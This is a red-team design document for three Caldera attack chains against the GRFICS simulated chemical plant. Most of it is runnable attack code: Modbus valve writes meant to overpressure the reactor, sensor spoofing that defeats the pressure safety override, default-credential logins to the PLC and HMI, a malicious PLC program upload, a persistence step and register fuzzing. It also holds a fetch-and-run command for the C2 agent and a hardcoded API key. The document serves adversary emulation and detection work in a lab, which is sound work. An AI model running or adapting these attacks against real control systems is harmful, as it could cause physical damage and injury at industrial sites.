# GRFICS ICS/OT Attack Chain Design for Caldera

## Environment Reference

### Network Topology

| Zone | Subnet | Assets |
|------|--------|--------|
| **ICS Process Net** (`b-ics-net`) | `192.168.95.0/24` | Simulation (.10-.15), PLC (.2), EWS (.5), Router (.200) |
| **DMZ** (`c-dmz-net`) | `192.168.90.0/24` | HMI (.107), Kali (.6), Caldera (.250), Router (.200) |
| **Admin** (`a-grfics-admin`) | Docker bridge | All containers (management plane) |

### ICS Asset Inventory

| Asset | IP | Port(s) | Protocol | Role | Credentials |
|-------|----|---------|----------|------|-------------|
| Simulation (Feed 1) | 192.168.95.10 | 502/tcp | Modbus TCP | Remote I/O - Feed 1 valve/flow | -- |
| Simulation (Feed 2) | 192.168.95.11 | 502/tcp | Modbus TCP | Remote I/O - Feed 2 valve/flow | -- |
| Simulation (Purge) | 192.168.95.12 | 502/tcp | Modbus TCP | Remote I/O - Purge valve/flow | -- |
| Simulation (Product) | 192.168.95.13 | 502/tcp | Modbus TCP | Remote I/O - Product valve/flow | -- |
| Simulation (Tank) | 192.168.95.14 | 502/tcp | Modbus TCP | Remote I/O - Pressure/Level | -- |
| Simulation (Analyzer) | 192.168.95.15 | 502/tcp | Modbus TCP | Remote I/O - Composition (A/B/C) | -- |
| PLC (OpenPLC) | 192.168.95.2 | 8080/tcp, 502/tcp | HTTP, Modbus | PLC Runtime + Web API | `openplc:openplc` |
| EWS | 192.168.95.5 | 6080/tcp | HTTP (noVNC) | Engineering Workstation | -- |
| HMI (SCADA-LTS) | 192.168.90.107 | 8080/tcp | HTTP | Operator HMI | `admin:admin` |
| Router/FW | 192.168.95.200 / 192.168.90.200 | 5000/tcp | HTTP | Firewall + Suricata IDS | `admin:password` |

### Modbus Register Map (from `mbconfig.cfg` and device scripts)

| Device | IP | Holding Reg [1] (write) | Input Reg [1] | Input Reg [2] | Input Reg [3] |
|--------|----|------------------------|---------------|---------------|---------------|
| Feed 1 | .10 | f1_valve_sp (0-65535 = 0-100%) | f1_valve_pos | f1_flow | -- |
| Feed 2 | .11 | f2_valve_sp | f2_valve_pos | f2_flow | -- |
| Purge | .12 | purge_valve_sp | purge_valve_pos | purge_flow | -- |
| Product | .13 | product_valve_sp | product_valve_pos | product_flow | -- |
| Tank | .14 | -- (read only) | pressure (0-3200 kPa) | level (0-100%) | -- |
| Analyzer | .15 | -- (read only) | A_in_purge (0-1.0) | B_in_purge | C_in_purge |

### PLC Control Logic Summary (from `326339.st`)

The PLC runs proportional control at 20ms cycle:
- **f1_valve_sp** = f(product_flow, product_flow_setpoint) with k=20.0, range 0-500
- **purge_valve_sp** = f(pressure, pressure_sp) with k=-20.0, range 0-3200
- **f2_valve_sp** = f(a_in_purge, a_setpoint) with k=1.0, range 0-100
- **product_valve_sp** = f(level, level_sp) with k=-10.0, range 0-100
- **pressure_override**: reduces product_flow_setpoint when pressure > 2900 kPa
- **run_bit** (`%QX5.0`): if FALSE, feeds close (0), purge/product open (65535) = safe shutdown

Default setpoints: product_flow=13107, a_setpoint=30801, pressure_sp=55295, override_sp=31675, level_sp=28835.

---

## Assumptions

1. **Network Access**: The attacker starts from the Kali container (192.168.90.6) in the DMZ. The router forwards all traffic between DMZ and ICS net by default (`iptables -P FORWARD ACCEPT`).
2. **Credentials**: Default credentials are in use on PLC (`openplc:openplc`), HMI (`admin:admin`), and router (`admin:password`). These are discoverable via the 3D walkthrough (sticky notes) or brute force.
3. **Protocols**: Modbus TCP (port 502) is unauthenticated by design. There is no TLS, no Modbus security, no whitelisting on the Modbus servers.
4. **Caldera Agent Deployment**: A Sandcat or Manx agent can be deployed on Kali (pre-staged) and later on EWS or PLC after compromise. The Caldera server at 192.168.90.250 is reachable from both DMZ and (via router) ICS net.
5. **Suricata IDS** on the router may generate alerts for known Modbus signatures but takes no blocking action by default.
6. **OpenPLC Web API** allows program upload, start/stop, and configuration changes via HTTP with valid credentials.

---

## Attack Chain 1: Stealthy Process Manipulation via Direct Modbus Write

**Adversary Profile**: Sophisticated attacker targeting process integrity. Goal is to cause a gradual pressure buildup in the reactor to exceed safe operating limits while remaining undetected.

**Kill Chain Summary**: DMZ foothold -> Network discovery -> Pivot through router -> Modbus device enumeration -> Process state reconnaissance -> Targeted valve manipulation -> Pressure excursion

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Deploy Caldera Sandcat agent on Kali via HTTP beacon to `http://192.168.90.250:8888` | Establish C2 channel from DMZ attacker node |
| **Discovery** | 2 | Remote System Discovery | T0846 | `nmap -sn 192.168.90.0/24` from Kali agent | Discover HMI (.107), Router (.200), Caldera (.250) on DMZ |
| **Discovery** | 3 | Network Sniffing | T0842 | `tcpdump -i eth0 -nn port 502` on Kali (after pivot) | Observe Modbus traffic patterns between PLC and simulation |
| **Lateral Movement** | 4 | Default Credentials | T0812 | Route exists via router; use Modbus TCP directly to 192.168.95.x | Pivot from DMZ to ICS network through router |
| **Discovery** | 5 | Remote System Information Discovery | T0888 | `modbus_cli 192.168.95.10 read_device_info --level 3` for each .10-.15 | Enumerate all 6 Modbus devices, get vendor/product info |
| **Collection** | 6 | Point & Tag Identification | T0861 | `modbus_cli <ip> read_ir 1 3` for each device | Map register contents to physical process variables |
| **Collection** | 7 | Monitor Process State | T0801 | Repeatedly read IR[1-2] from Tank (.14) to observe pressure/level trends | Establish baseline: normal pressure ~2450 kPa, level ~65% |
| **Inhibit Response** | 8 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.12 write_r 1 0` (close purge valve) | Purge valve closes -> pressure begins rising |
| **Impact** | 9 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.10 write_r 1 65535` (open feed valve fully) | Feed 1 wide open + purge closed -> rapid pressure excursion |
| **Impact** | 10 | Damage to Property | T0879 | Sustained writes every 100ms to override PLC corrections | Pressure exceeds 3200 kPa -> potential reactor overpressure event |

### Caldera Implementation

#### Step 1: Deploy Agent on Kali

From the Caldera web UI (`http://localhost:8888`, login `red:fortiphyd-red`):

1. Navigate to **Agents** -> **Deploy an Agent**
2. Select **Sandcat** agent, platform **Linux**
3. Set the app.contact.http to `http://192.168.90.250:8888`
4. Copy the deployment one-liner. On Kali (via noVNC at `http://localhost:6088`), open a terminal and run:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

The agent will beacon back and appear in the Caldera Agents panel as the Kali host.

#### Step 2: Create Custom Abilities

Create these ability YAML files and place them in `plugins/modbus/data/abilities/` inside the Caldera container (or use the Caldera REST API).

**Ability: Network Scan (Discovery)**

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000001
  name: Nmap ICS Subnet Discovery
  description: Scan the ICS process network for live Modbus hosts
  tactic: discovery
  technique_id: T0846
  technique_name: Remote System Discovery
  executors:
  - platform: linux
    name: sh
    command: >
      nmap -sn 192.168.95.0/24 -oG - | grep "Up" | awk '{print $2}'
```

**Ability: Modbus Read Device Info (already exists as `9360ba0d-...`)**

Uses the existing fact source targeting `192.168.95.10:502`.

**Ability: Read Process State (Collection)**

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000002
  name: Modbus - Read Tank Pressure and Level
  description: Read input registers from Tank device to observe pressure and liquid level
  tactic: collection
  technique_id: T0801
  technique_name: Monitor Process State
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2
    payloads:
    - modbus_cli
```

**Ability: Read All Process Variables (Collection)**

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000003
  name: Modbus - Enumerate All Process I/O
  description: Read input registers from all 6 Modbus devices to map the process
  tactic: collection
  technique_id: T0861
  technique_name: Point & Tag Identification
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== Feed 1 (192.168.95.10) ===" &&
      ./modbus_cli 192.168.95.10 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&
      echo "=== Feed 2 (192.168.95.11) ===" &&
      ./modbus_cli 192.168.95.11 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.11 --port 502 read_hr 1 1 &&
      echo "=== Purge (192.168.95.12) ===" &&
      ./modbus_cli 192.168.95.12 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&
      echo "=== Product (192.168.95.13) ===" &&
      ./modbus_cli 192.168.95.13 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.13 --port 502 read_hr 1 1 &&
      echo "=== Tank (192.168.95.14) ===" &&
      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&
      echo "=== Analyzer (192.168.95.15) ===" &&
      ./modbus_cli 192.168.95.15 --port 502 read_ir 1 3
    payloads:
    - modbus_cli
```

**Ability: Close Purge Valve (Impact)**

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000004
  name: Modbus - Close Purge Valve
  description: |
    Write holding register 1 on Purge device (192.168.95.12) to 0,
    forcing the purge valve fully closed. This traps gas in the reactor,
    causing pressure to build.
  tactic: inhibit-response-function
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 50); do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

**Ability: Open Feed Valve Fully (Impact)**

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000005
  name: Modbus - Force Feed 1 Valve Open
  description: |
    Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
    forcing maximum inflow. Combined with purge closure, this rapidly
    increases reactor pressure.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 50); do
        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

#### Step 3: Create Adversary Profile

```yaml
---

id: cc001111-aaaa-bbbb-cccc-000000000001
name: ICS Pressure Manipulation Adversary
description: |
  Stealthy attack chain targeting the GRFICS chemical process.
  Discovers ICS network, enumerates Modbus devices, reads process state,
  then manipulates valves to cause reactor overpressure.
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Read device info (existing)
- a1b2c3d4-1111-1111-1111-000000000003  # Modbus - Enumerate All Process I/O (Point & Tag Identification : T0861)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
- a1b2c3d4-1111-1111-1111-000000000004  # Modbus - Close Purge Valve (Manipulation of Control : T0831 )
- a1b2c3d4-1111-1111-1111-000000000005  # Modbus - Force Feed 1 Valve Open (Manipulation of Control : T0831)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
```

#### Step 4: Configure and Run Operation

Via the Caldera UI:

1. Go to **Operations** -> **Create Operation**
2. **Name**: `ICS-Pressure-Attack-001`
3. **Adversary**: `ICS Pressure Manipulation Adversary`
4. **Fact Source**: `Modbus Sample Facts` (ID `0033b644-...`)
5. **Planner**: `atomic` (sequential execution)
6. **Group**: `red` (the Kali agent)
7. **Autonomous**: `1` (run each step automatically)
8. Click **Start**

Alternatively, use the REST API:

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ICS-Pressure-Attack-001",
    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Nmap scan | Router/Suricata (`shared_logs/router/eve.json`) | ICMP sweep + SYN scan alerts | DC0078 (Network Traffic Flow) |
| Modbus read_device_info | Router/Suricata | Modbus FC=0x2B on port 502 from 192.168.90.6 | DC0082 (Network Traffic Content) |
| Read input registers | Router/Suricata, PLC daemon.log | Modbus FC=0x04 reads from non-PLC source IP | DC0085 (Network Connection Creation) |
| Write holding registers | Router/Suricata, PLC daemon.log | Modbus FC=0x06 writes from unauthorized source (192.168.90.6 vs expected 192.168.95.2) | DC0082 (Network Traffic Content) |
| Pressure excursion | Simulation process_alarms (`shared_logs/simulation/alarms`) | Pressure value exceeding normal range (>3000 kPa) | DC0109 (Process/Event Alarm) |
| Valve position change | HMI/SCADA-LTS logs (`shared_logs/hmi/catalina`) | Sudden purge valve close + feed valve open event | DC0109 (Process/Event Alarm) |

### Variation: Stealthier Approach

Instead of slamming valves to extremes, write small incremental changes (e.g., reduce purge by 5% every 30 seconds) to stay within normal operating noise:

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000006
  name: Modbus - Gradual Purge Reduction
  description: Incrementally close purge valve to avoid sudden process alarms
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      val=60000; while [ $val -gt 0 ]; do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 $val;
        val=$((val - 3000));
        sleep 30;
      done
    payloads:
    - modbus_cli
```

This takes ~10 minutes to fully close the valve, giving pressure time to rise gradually and avoiding spike-based alarm thresholds.

### Escalation Path: Dual Valve + Sensor Spoofing

After closing purge and opening feed, simultaneously write false "normal" values to the Tank device's input registers to mask the pressure rise from the PLC's perspective:

```yaml
---

- id: a1b2c3d4-1111-1111-1111-000000000007
  name: Modbus - Spoof Tank Pressure Reading
  description: |
    Write false input register values to the Tank Modbus device,
    making the PLC believe pressure is normal while it actually rises.
    Targets IR address 1 on 192.168.95.14.
  tactic: evasion
  technique_id: T0856
  technique_name: Spoof Reporting Message
  executors:
  - platform: linux
    name: sh
    command: >
      while true; do
        ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

This prevents the PLC's `pressure_override` function from activating (it triggers at ~2900 kPa), allowing unrestricted pressure buildup.

---

## Attack Chain 2: PLC Logic Replacement via OpenPLC Web Interface

**Adversary Profile**: Targeted attacker who compromises the PLC programming interface to upload malicious control logic. Goal is to replace the legitimate Structured Text program with one that disables safety interlocks.

**Kill Chain Summary**: DMZ foothold -> HMI compromise -> Credential harvesting -> PLC web login -> Program download (recon) -> Malicious ST upload -> Process disruption

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Access HMI web interface at `192.168.90.107:8080` with `admin:admin` | Gain HMI access, observe process data |
| **Discovery** | 2 | Remote System Discovery | T0846 | From HMI context, enumerate data sources pointing to `192.168.95.2` (PLC) | Identify PLC IP and Modbus configuration |
| **Credential Access** | 3 | Default Credentials | T0812 | Attempt `openplc:openplc` on `http://192.168.95.2:8080` | Authenticate to OpenPLC web runtime |
| **Collection** | 4 | Program Upload | T0843 | Download current program via OpenPLC web UI (`/programs` endpoint) | Obtain `326339.st` for analysis |
| **Lateral Movement** | 5 | Program Upload | T0843 | Upload malicious ST file via OpenPLC web API | Replace legitimate control logic |
| **Inhibit Response** | 6 | Modify Program | T0889 | Malicious ST sets `run_bit := FALSE` or removes safety interlocks | PLC executes attacker logic |
| **Impact** | 7 | Loss of Control | T0827 | Modified program opens all valves / ignores pressure override | Chemical process goes out of control |

### Caldera Implementation

#### Step 1: Agent on Kali (same as Chain 1)

#### Step 2: Create Abilities

**Ability: Brute-force OpenPLC Login**

```yaml
---

- id: b2c3d4e5-2222-2222-2222-000000000001
  name: OpenPLC - Default Credential Access
  description: Login to OpenPLC web runtime with default credentials
  tactic: credential-access
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/plc_cookies.txt
      -d "username=openplc&password=openplc"
      "http://192.168.95.2:8080/login"
      -o /tmp/plc_login.html -w "%{http_code}" &&
      HTTP=$(tail -c 3 /tmp/plc_login.html) &&
      echo "HTTP_STATUS: $HTTP" &&
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/dashboard"
      -o /tmp/plc_dash.html &&
      grep -qi "running\|dashboard\|programs" /tmp/plc_dash.html &&
      echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
    timeout: 60
```

**Ability: Download Current PLC Program**

```yaml
---

- id: b2c3d4e5-2222-2222-2222-000000000002
  name: OpenPLC - Download Running Program
  description: Download the currently active Structured Text program from OpenPLC
  tactic: collection
  technique_id: T0843
  technique_name: Program Upload
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/get-program-body?program_name=326339.st"
      -o /tmp/original_program.st &&
      echo "Downloaded program:" &&
      head -20 /tmp/original_program.st
```

**Ability: Upload Malicious PLC Program**

```yaml
---

- id: b2c3d4e5-2222-2222-2222-000000000003
  name: OpenPLC - Upload Malicious Control Logic
  description: |
    Write a malicious ST program using printf (no heredoc) and upload it.
    Disables pressure override and forces dangerous valve positions.
  tactic: impair-process-control
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      printf 'PROGRAM main1\n' > /tmp/malicious.st &&
      printf '  VAR\n' >> /tmp/malicious.st &&
      printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/malicious.st &&
      printf '    f2_valve_sp AT %%QW101 : UINT;\n' >> /tmp/malicious.st &&
      printf '    purge_valve_sp AT %%QW102 : UINT;\n' >> /tmp/malicious.st &&
      printf '    product_valve_sp AT %%QW103 : UINT;\n' >> /tmp/malicious.st &&
      printf '    run_bit AT %%QX5.0 : BOOL := TRUE;\n' >> /tmp/malicious.st &&
      printf '  END_VAR\n' >> /tmp/malicious.st &&
      printf '  f1_valve_sp := 65535;\n' >> /tmp/malicious.st &&
      printf '  f2_valve_sp := 65535;\n' >> /tmp/malicious.st &&
      printf '  purge_valve_sp := 0;\n' >> /tmp/malicious.st &&
      printf '  product_valve_sp := 0;\n' >> /tmp/malicious.st &&
      printf '  run_bit := TRUE;\n' >> /tmp/malicious.st &&
      printf 'END_PROGRAM\n' >> /tmp/malicious.st &&
      printf 'CONFIGURATION Config0\n' >> /tmp/malicious.st &&
      printf '  RESOURCE Res0 ON PLC\n' >> /tmp/malicious.st &&
      printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);\n' >> /tmp/malicious.st &&
      printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/malicious.st &&
      printf '  END_RESOURCE\n' >> /tmp/malicious.st &&
      printf 'END_CONFIGURATION\n' >> /tmp/malicious.st &&
      echo "ST file created:" && wc -l /tmp/malicious.st &&
      curl -s -b /tmp/plc_cookies.txt
      -F "file=@/tmp/malicious.st"
      "http://192.168.95.2:8080/upload-program-action"
      -o /tmp/upload_result.html -w "%{http_code}" &&
      echo "PROGRAM_UPLOADED"
    timeout: 60
```

**Ability: Compile and Start Malicious Program**

```yaml
---

- id: b2c3d4e5-2222-2222-2222-000000000004
  name: OpenPLC - Compile and Run Malicious Logic
  description: Trigger compilation and start the uploaded malicious program on OpenPLC
  tactic: impair-process-control
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/compile-program?program_name=malicious.st"
      -o /tmp/compile_result.html &&
      sleep 5 &&
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/start-plc"
      -o /tmp/start_result.html &&
      echo "Malicious program compiled and started"
    timeout: 120
```

#### Step 3: Adversary Profile

```yaml
---

id: cc002222-aaaa-bbbb-cccc-000000000002
name: PLC Logic Replacement Adversary
description: |
  Compromise PLC via web interface using default credentials,
  download legitimate program for analysis, upload malicious
  control logic that removes safety interlocks and forces
  dangerous valve positions.
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
- b2c3d4e5-2222-2222-2222-000000000001  # OpenPLC - Default Credential Access (Default Credentials : T0812)
- b2c3d4e5-2222-2222-2222-000000000002  # OpenPLC - Download Running Program (Program Upload : T0845)
- b2c3d4e5-2222-2222-2222-000000000003  # OpenPLC - Upload Malicious Control Logic (Modify Program : T0889)
- b2c3d4e5-2222-2222-2222-000000000004  # OpenPLC - Compile and Run Malicious Logic (Modify Program : T0889)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
```

#### Step 4: Operation Setup

Same process as Chain 1 -- create operation via UI or API, select the `PLC Logic Replacement Adversary`, use the `red` agent group (Kali), `atomic` planner, `Modbus Sample Facts` source.

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| PLC web login | PLC auth.log (`shared_logs/plc/auth.log`) | HTTP auth from 192.168.90.6 to port 8080 | DC0067 (Logon Session Creation) |
| Program download | PLC syslog/daemon.log | GET request to /get-program-body | DC0033 (Process Creation) |
| Program upload | PLC syslog/daemon.log, PLC audit | POST to /upload-program with new .st file | DC0021 (File Modification), DC0034 (Process Metadata) |
| Compile trigger | PLC syslog/daemon.log | `compile_program.sh` execution, matiec compiler invocation | DC0033 (Process Creation) |
| PLC restart | PLC daemon.log | OpenPLC runtime stop + start cycle | DC0033 (Process Termination / Creation) |
| Process impact | Simulation alarms, Tank IR values | All feeds max, purge closed, pressure rising | DC0109 (Process/Event Alarm) |
| Suricata | Router eve.json | HTTP traffic from DMZ host to PLC on port 8080 | DC0078 (Network Traffic Flow) |

### Variation: Subtle Logic Modification

Instead of replacing the entire program, modify only the `pressure_override` function to have a higher threshold (e.g., change `override_sp_real` from 2900.0 to 9999.0). This preserves normal-looking control behavior but disables the safety interlock that prevents overpressure:

```
override_sp_real : REAL := 9999.0;  (* was 2900.0 *)
```

This is harder to detect because the PLC program looks mostly unchanged and control loops still operate normally -- until pressure exceeds what the override would have caught.

### Escalation Path: Persistent Backdoor via Cron on PLC

After uploading the malicious program, deploy a persistence mechanism on the PLC host:

```yaml
---

- id: b2c3d4e5-2222-2222-2222-000000000005
  name: OpenPLC - Deploy Persistent Watchdog
  description: |
    Create a cron job on the PLC that re-uploads and recompiles the
    malicious program every 5 minutes, defeating any operator restore.
  tactic: persistence
  technique_id: T0839
  technique_name: Module Firmware
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/upload-program"
      -F "file=@/tmp/malicious.st" &&
      echo "Re-uploaded malicious program as persistence mechanism"
```

---

## Attack Chain 3: HMI Compromise + Operator Deception + Process Manipulation

**Adversary Profile**: APT-style attacker who compromises the SCADA HMI to both manipulate the process AND deceive operators by modifying displayed values. Mirrors the TRITON/TRISIS concept of attacking safety while masking the attack.

**Kill Chain Summary**: HMI web compromise -> Data source enumeration -> Modbus proxy insertion -> Process manipulation with simultaneous HMI display falsification

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Default Credentials | T0812 | Login to SCADA-LTS at `192.168.90.107:8080` with `admin:admin` | Full HMI administrative access |
| **Discovery** | 2 | Remote System Discovery | T0846 | Enumerate SCADA-LTS data sources and Modbus configuration | Identify PLC connection at 192.168.95.2, register mappings |
| **Collection** | 3 | Screen Capture | T0852 | Capture current HMI dashboard state / record normal values | Establish baseline operator view to replicate later |
| **Discovery** | 4 | Remote System Information Discovery | T0888 | `modbus_cli` read_device_info against all .10-.15 targets | Full Modbus device fingerprinting |
| **Collection** | 5 | Monitor Process State | T0801 | Read all IR/HR values across all 6 devices | Complete process state snapshot |
| **Evasion** | 6 | Spoof Reporting Message | T0856 | Modify SCADA-LTS data source polling to point at attacker-controlled proxy | HMI shows stale/false process values |
| **Impact** | 7 | Manipulation of Control | T0831 | Write dangerous values to Modbus devices directly | Physical process goes out of specification |
| **Impact** | 8 | Loss of View | T0829 | Operators see normal values on HMI while process deviates | Operator cannot detect the attack via HMI |

### Caldera Implementation

#### Step 1: Agent Deployment (same as Chain 1)

#### Step 2: Create Abilities

**Ability: SCADA-LTS Login and Recon**

```yaml
---

- id: c3d4e5f6-3333-3333-3333-000000000001
  name: SCADA-LTS - Default Credential Login
  description: Login to SCADA-LTS HMI at root context path
  tactic: credential-access
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/hmi_cookies.txt
      -d "username=admin&password=admin"
      "http://192.168.90.107:8080/login.htm"
      -o /tmp/hmi_login.html -w "%{http_code}" &&
      echo "HTTP_STATUS:" &&
      curl -s -b /tmp/hmi_cookies.txt
      "http://192.168.90.107:8080/data_point_details.shtm"
      -o /tmp/hmi_check.html &&
      grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html &&
      echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
    timeout: 60
```

**Ability: Enumerate SCADA-LTS Data Sources**

```yaml
---

- id: c3d4e5f6-3333-3333-3333-000000000002
  name: SCADA-LTS - Enumerate Data Sources
  description: |
    Use SCADA-LTS REST API to enumerate all configured data sources
    and data points, revealing Modbus connections and register mappings
  tactic: discovery
  technique_id: T0846
  technique_name: Remote System Discovery
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/hmi_cookies.txt
      "http://192.168.90.107:8080/ScadaBR/api/datasources"
      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
      curl -s -b /tmp/hmi_cookies.txt
      "http://192.168.90.107:8080/ScadaBR/api/datapoints"
      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
      echo "API enumeration attempted"
```

**Ability: Simultaneous Process Attack + Sensor Spoofing**

```yaml
---

- id: c3d4e5f6-3333-3333-3333-000000000003
  name: Modbus - Combined Attack and Deception
  description: |
    Close purge, open feeds, and spoof tank pressure simultaneously.
    Uses simple for loop instead of shell functions.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 30); do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;
        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;
        ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;
        ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;
        sleep 0.2;
      done &&
      echo "COMBINED_ATTACK_COMPLETE"
    payloads:
    - modbus_cli
    timeout: 120
```

**Ability: Modbus Fuzzing for Chaos**

```yaml
---

- id: c3d4e5f6-3333-3333-3333-000000000004
  name: Modbus - Fuzz All Registers for Maximum Disruption
  description: |
    Use modbus_cli fuzz_r to randomly write all holding registers
    on Feed 1, Feed 2, and Purge devices, creating unpredictable
    process behavior that is difficult to diagnose.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.10 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      ./modbus_cli 192.168.95.11 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      ./modbus_cli 192.168.95.12 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      wait
    payloads:
    - modbus_cli
```

#### Step 3: Adversary Profile

```yaml
---

id: cc003333-aaaa-bbbb-cccc-000000000003
name: HMI Compromise and Operator Deception Adversary
description: |
  APT-style attack that compromises the HMI to gain process visibility,
  then simultaneously manipulates valves AND spoofs sensor readings to
  prevent both automated safety functions and operator awareness from
  detecting the attack.
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network discovery
- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Modbus device info
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login
- c3d4e5f6-3333-3333-3333-000000000002  # Enumerate data sources
- a1b2c3d4-1111-1111-1111-000000000003  # Read all process I/O
- c3d4e5f6-3333-3333-3333-000000000003  # Combined attack + deception
```

#### Step 4: Operation (same pattern as Chains 1 & 2)

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| HMI login | HMI auth.log, Tomcat catalina.log (`shared_logs/hmi/catalina`) | POST to /login.htm from 192.168.90.6 | DC0067 (Logon Session Creation) |
| API enumeration | Tomcat access logs | GET /api/datasources, /api/datapoints from attacker IP | DC0078 (Network Traffic Flow) |
| Modbus writes to multiple devices | Router Suricata eve.json | Burst of FC=0x06 writes from 192.168.90.6 to .10,.11,.12,.14 | DC0082 (Network Traffic Content) |
| Sensor spoofing on .14 | Simulation process alarms | Discrepancy between simulation internal pressure and Modbus-reported pressure | DC0109 (Process/Event Alarm) |
| Purge valve manipulation | PLC app logs, simulation alarms | Purge valve position drops to 0 despite PLC commanding otherwise | DC0109 (Process/Event Alarm) |
| Rate of Modbus transactions | Router Suricata | Abnormal burst of 5+ Modbus writes per second from a single source | DC0085 (Network Connection Creation) |

### Variation: Noisier Approach - Modbus Register Fuzzing

